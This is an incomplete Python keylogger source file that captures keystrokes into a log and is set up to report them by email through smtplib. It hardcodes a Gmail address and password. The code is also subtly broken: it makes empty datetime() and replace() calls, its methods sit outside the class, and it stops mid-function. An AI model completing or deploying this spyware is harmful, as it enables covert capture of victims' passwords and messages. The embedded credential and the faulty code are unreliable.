import keyboard
import smtplib
from threading import Timer
from datetime import datetime

report_every  = 60
email_address = 'salemazimov@gmail.com'
email_password = 'dragons2017'

class Keylogger:
    def __init__(self, interval, report_method = 'email'):
        self.interval  = interval
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime()

def callback(self, event):
    name = event.name
    if len(name) > 1:
        if name == 'space':
            name = ' '
        elif name == 'enter':
            name = '[ENTER]\n'
        elif name == 'decimal':
            name = '.'
        else:
            name = name.replace(' ', '_')
            name = f'[{name.upper()}]'
    self.log += name

def update_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(' ', '-').replace()